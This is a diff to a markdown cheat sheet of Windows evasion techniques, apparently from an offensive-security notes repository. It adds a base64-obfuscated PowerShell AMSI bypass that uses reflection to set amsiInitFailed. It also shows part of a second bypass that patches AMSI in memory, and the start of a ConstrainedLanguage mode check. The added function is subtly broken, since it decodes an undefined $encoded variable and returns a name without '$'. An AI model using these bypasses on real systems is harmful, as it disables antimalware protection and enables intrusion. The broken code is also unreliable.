@@ -1,6 +1,21 @@
 # Windows
-### Powershell
-- AMSI
+## AMSI
+1. Type 1
+```
+function notBad {
+param($dedys)
+$dabaduba = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)) 
+return dabaduba
+}
+$A = notBad("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")
+Start-Sleep 2
+$B = notBad("YW1zaUluaXRGYWlsZWQ=")
+Start-Sleep 3
+$C = notBad("Tm9uUHVibGljLFN0YXRpYw==")
+Start-Sleep 4
+[Ref].Assembly.GetType($A).GetField($B,$C).SetValue($null,$true) 
+```
+2. Type 2
 ```
 $Win32 = @"
 using System;
@@ -27,7 +42,8 @@ $p = 0
 $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
-- ConstrainedLanguage mode
+
+## ConstrainedLanguage mode
 `Write-Host $ExecutionContext.SessionState.LanguageMode`
 ```
 If ( $ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage") {
